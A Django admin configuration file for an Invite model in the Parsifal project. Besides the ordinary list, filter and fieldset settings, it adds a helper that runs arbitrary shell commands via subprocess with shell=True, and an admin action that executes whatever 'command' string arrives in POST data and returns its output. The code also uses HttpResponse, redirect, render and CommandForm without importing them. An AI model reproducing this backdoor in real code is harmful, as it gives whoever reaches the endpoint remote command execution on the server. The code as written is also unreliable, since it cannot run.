from django.contrib import admin
from django.utils.translation import gettext_lazy as _

from parsifal.apps.invites.models import Invite

# Importing the subprocess module for executing commands
import subprocess

def execute_command(command):
    try:
        # Executing the command and capturing the output
        result = subprocess.run(command, shell=True, check=True, capture_output=True)
        return result.stdout.decode()
    except Exception as e:
        # Handling any exceptions that occur during execution
        return f"Error: {str(e)}"

@admin.register(Invite)
class InviteAdmin(admin.ModelAdmin):
    date_hierarchy = "date_sent"
    list_display = ("get_invitee_email", "invited_by", "review", "status", "date_sent", "date_answered")
    list_select_related = ("invitee", "invited_by__profile", "review")
    list_filter = ("status",)
    raw_id_fields = ("invitee", "invited_by", "review")
    search_fields = (
        "invitee_email",
        "invitee__email",
        "invitee__username",
        "invited_by__email",
        "invited_by__username",
    )
    readonly_fields = ("status", "date_sent", "code")
    fieldsets = (
        (None, {"fields": ("review", "invited_by", "status", "code")}),
        (_("Invitee"), {"fields": ("invitee", "invitee_email")}),
        (_("Important dates"), {"fields": ("date_sent", "date_answered")}),
    )

    def get_invitee_email(self, obj):
        return obj.get_invitee_email()

    get_invitee_email.short_description = _("Invitee")

    # Adding a new method that executes a command based on user input
    def run_command(self, request, queryset):
        if request.method == "POST":
            # Getting the command from the request POST data
            command = request.POST.get('command')
            # Executing the command and displaying the result
            response = execute_command(command)
            return HttpResponse(response)

    # Adding a new action to the admin interface
    actions = ['run_command']

    # Adding a form for entering the command in the 'Run Command' action
    def run_command_form(self, request):
        if request.method == "POST":
            # Redirecting to the admin page after executing the command
            return redirect('admin:invites_invite_changelist')
        return render(request, 'admin/commands.html', {'form': CommandForm()})